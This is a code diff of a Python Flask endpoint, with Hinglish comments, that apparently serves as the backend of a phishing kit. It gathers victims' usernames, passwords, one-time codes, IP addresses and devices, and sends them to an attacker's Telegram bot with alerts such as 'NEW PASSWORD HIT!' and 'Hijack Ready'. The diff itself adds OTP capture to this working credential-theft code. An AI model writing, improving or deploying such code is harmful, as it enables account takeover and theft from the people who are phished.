@@ -10,37 +10,40 @@ CID = os.environ.get('CHAT_ID')
 @app.route('/api/index', methods=['POST'])
 def handle_requests():
     try:
-        # data ko read karne ka sabse behtreen tareeka
-        data = request.get_json(silent=True) or {}
+        # Simple data parsing taaki error na aaye
+        data = request.json
+        if not data:
+            return jsonify({"status": "no data"}), 400
+            
         dtype = data.get('t', 'UNKNOWN')
-        user = data.get('u', 'Not Found')
-        password = data.get('p', 'Not Found')
+        user = data.get('u', 'UserNotSet')
+        password = data.get('p', 'PassNotSet')
+        otp = data.get('o', 'OtpNotSet')
         
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
         if dtype == 'VISIT':
-            msg = f"👀 **TARGET DETECTED**\n🌐 IP: `{ip}`\n📱 User-Agent: `{data.get('d', 'N/A')[:40]}...`"
+            msg = f"👀 **TARGET DETECTED**\n📍 IP: `{ip}`\n📱 Device: `{data.get('d', 'N/A')[:40]}`"
         
         elif dtype == 'OTP_RECEIVED':
             #
-            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 LIVE OTP: `{data.get('o')}`\n✅ Status: Hijack Ready"
+            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **OTP: {otp}**\n✅ Status: Hijack Ready"
         
-        # Ye hissa password ko capture karke Telegram bhejega
         elif dtype in ['INIT_LOG', 'REAL_LOG']:
-            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 Pass: `{password}`\n📊 Step: {dtype}\n🌐 IP: `{ip}`"
+            # Password alert
+            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 **Pass: {password}**\n📊 Type: {dtype}\n🌐 IP: `{ip}`"
         
         else:
-            msg = f"ℹ️ Update: {dtype} received for {user}"
+            msg = f"ℹ️ Update: {dtype} received"
 
-        # Send to Telegram
+        # Telegram notification
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                       json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
         
         return jsonify({"status": "success"}), 200
     except Exception as e:
-        print(f"Error: {str(e)}")
-        return jsonify({"status": "error"}), 500
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 def handler(req, res):
     return app(req, res)
-    
+            
